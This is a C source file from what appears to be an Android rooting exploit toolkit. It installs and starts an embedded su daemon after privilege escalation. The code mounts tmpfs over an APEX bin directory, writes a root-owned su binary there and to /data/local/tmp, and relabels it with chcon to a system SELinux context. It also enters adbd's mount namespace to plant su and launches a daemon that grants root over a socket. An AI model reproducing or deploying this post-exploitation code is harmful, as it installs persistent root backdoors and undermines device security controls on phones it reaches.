/* Installs the embedded su daemon — warhol-root's route, unchanged.
 *
 * `su_daemon.c` is built as a standalone aarch64 PIE
 * (`build/embed/su_daemon_aarch64_pie`) and `su_blob.S` pulls that binary into
 * .rodata with .incbin, so the whole thing still ships as the one `preload.so`
 * that gets pushed. This file drops the blob back out as `su` and starts it.
 *
 * It lives in its own file rather than in `preload.c` only because this tree's
 * `preload.c` already has a different job (the constructor and the dual-sink
 * log); warhol-root carries the same code in `preload.c` because its
 * `preload.c` is just the constructor.
 *
 * Where it is called from is the one real difference between the two trees.
 * warhol-root roots the exploit process itself, so it calls this straight from
 * `run_direct_root()`. Here the rooted context is the forked child in
 * `child_main()` — the parent stays the unprivileged caller and can never do
 * the install — so that is where it runs.
 */

#include "common.h"
#include <sys/mount.h>

#define SU_DST_DIR "/apex/com.android.virt/bin"
#define SU_DST SU_DST_DIR "/su"
#define SU_LOCAL "/data/local/tmp/su"
#define SU_SOCK "/data/local/tmp/temp_su.sock"
#define SU_LOG "/data/local/tmp/su_daemon.log"

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int path_is_mounted(const char *path) {
  int fd = open("/proc/mounts", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  char mounts[16384];
  ssize_t n = read(fd, mounts, sizeof(mounts) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  mounts[n] = 0;

  char needle[512];
  snprintf(needle, sizeof(needle), " %s ", path);
  return strstr(mounts, needle) != NULL;
}

static int ensure_su_mount(void) {
  if (path_is_mounted(SU_DST_DIR)) {
    return 1;
  }
  if (mount("tmpfs", SU_DST_DIR, "tmpfs", 0, "mode=0755,size=4m") == 0) {
    return 1;
  }
  return errno == EBUSY;
}

static void try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
}

static int write_embedded_su_file(const char *dir, const char *dst) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.su.new.%d", dir, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    return 0;
  }
  int ok = write_full(fd, embedded_su_start, size);
  int saved_errno = errno;
  if (ok) {
    ok = fchown(fd, 0, 0) == 0 && fchmod(fd, 0755) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  try_chcon(dst);
  pr_success("embedded su wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static int write_embedded_su(void) {
  if (!ensure_su_mount()) {
    return 0;
  }
  return write_embedded_su_file(SU_DST_DIR, SU_DST);
}

static pid_t find_adbd_pid(void) {
  DIR *dir = opendir("/proc");
  if (!dir) {
    return -1;
  }

  struct dirent *de;
  while ((de = readdir(dir)) != NULL) {
    char *end = NULL;
    long pid_long = strtol(de->d_name, &end, 10);
    if (!end || *end || pid_long <= 1 || pid_long > INT32_MAX) {
      continue;
    }

    char path[64];
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid_long);
    char comm[32];
    read_first_line(path, comm, sizeof(comm));
    if (strcmp(comm, "adbd") == 0) {
      closedir(dir);
      return (pid_t)pid_long;
    }
  }

  closedir(dir);
  return -1;
}

static int install_su_in_pid_mntns(pid_t target) {
  pid_t child = fork();
  if (child == 0) {
    char ns_path[64];
    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/mnt", target);
    int ns_fd = open(ns_path, O_RDONLY | O_CLOEXEC);
    if (ns_fd < 0) {
      _exit(2);
    }
    if (setns(ns_fd, CLONE_NEWNS) != 0) {
      _exit(3);
    }
    close(ns_fd);
    if (!ensure_su_mount()) {
      _exit(4);
    }
    _exit(write_embedded_su_file(SU_DST_DIR, SU_DST) ? 0 : 5);
  }
  if (child < 0) {
    return 0;
  }

  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int install_adb_visible_su(void) {
  pid_t adbd = find_adbd_pid();
  if (adbd <= 0) {
    pr_info("adb-visible su skipped: adbd pid not found\n");
    return 0;
  }
  int ok = install_su_in_pid_mntns(adbd);
  pr_info("adb-visible su install adbd=%d ok=%d path=%s\n", adbd, ok, SU_DST);
  return ok;
}

static int install_local_su_client(void) {
  int ok = write_embedded_su_file("/data/local/tmp", SU_LOCAL);
  pr_info("local su client install ok=%d path=%s\n", ok, SU_LOCAL);
  return ok;
}

static pid_t start_su_daemon(const char *su_path) {
  unlink(SU_SOCK);
  unlink(SU_LOG);

  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }
    int log_fd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (log_fd >= 0) {
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }
    execl(su_path, "su", "--daemon", (char *)NULL);
    _exit(127);
  }
  return pid;
}

static int probe_su_daemon(pid_t daemon_pid, const char *client) {
  if (daemon_pid <= 0 || kill(daemon_pid, 0) != 0) {
    return 0;
  }
  pid_t child = fork();
  if (child == 0) {
    execl(client, "su", "-c",
          "test \"$(id -u)\" = 0 && test \"$(id -g)\" = 0",
          (char *)NULL);
    _exit(127);
  }
  if (child < 0) {
    return 0;
  }
  int status = 0;
  while (waitpid(child, &status, 0) < 0) {
    if (errno != EINTR) {
      return 0;
    }
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }

  /* Order differs from warhol-root, which does the apex copy first and returns
   * straight away if it fails. That makes one mount the whole install: a
   * failed mount() there loses /data/local/tmp/su as well, and *that* copy
   * needs no mount, no namespace and no SELinux label to work.
   *
   * The apex path itself is right for this device -- SH-53D ships
   * /system/apex/com.android.virt.apex and its payload has bin/ (checked in
   * system.img, not assumed from warhol). This only stops a mount that fails
   * for some other reason from taking the run down with it. */
  int local_ok = install_local_su_client();
  int apex_ok = write_embedded_su();
  install_adb_visible_su();

  if (!local_ok && !apex_ok) {
    return 0;
  }

  /* Run the daemon out of whichever copy landed, and probe with whichever
   * client landed -- they need not be the same one. */
  const char *daemon_path = apex_ok ? SU_DST : SU_LOCAL;
  const char *client_path = local_ok ? SU_LOCAL : SU_DST;

  pid_t pid = start_su_daemon(daemon_path);
  if (pid <= 0) {
    return 0;
  }
  if (daemon_pid) {
    *daemon_pid = pid;
  }

  for (int i = 0; i < 50; i++) {
    if (access(SU_SOCK, F_OK) == 0 && probe_su_daemon(pid, client_path)) {
      pr_success("embedded su daemon ready pid=%d socket=%s daemon=%s\n",
                 pid, SU_SOCK, daemon_path);
      return 1;
    }
    usleep(100000);
  }

  errno = ETIMEDOUT;
  return 0;
}
